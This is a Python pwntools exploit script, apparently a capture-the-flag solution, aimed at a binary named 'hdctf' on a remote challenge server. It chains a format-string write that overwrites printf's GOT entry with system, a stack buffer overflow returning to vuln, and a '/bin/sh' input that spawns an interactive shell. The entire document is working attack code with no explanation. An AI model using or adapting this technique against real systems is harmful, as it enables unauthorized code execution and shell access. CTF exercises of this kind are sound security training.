
from pwn import *
from time import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')

p = process('./hdctf')
p = remote('node4.anna.nssctf.cn',28472)
elf = ELF('./hdctf')

printf_got = elf.got['printf']
system_plt = elf.plt['system']
vuln_addr = elf.symbols['vuln']

payload = fmtstr_payload(6, {printf_got: system_plt})
p.sendafter(b'name: \n',payload)

payload = b'a'*(0x50+0x8) + p64(vuln_addr)
p.sendafter(b'on !\n',payload)

payload = b'/bin/sh\x00'
p.sendafter(b'name: \n',payload)

p.interactive()


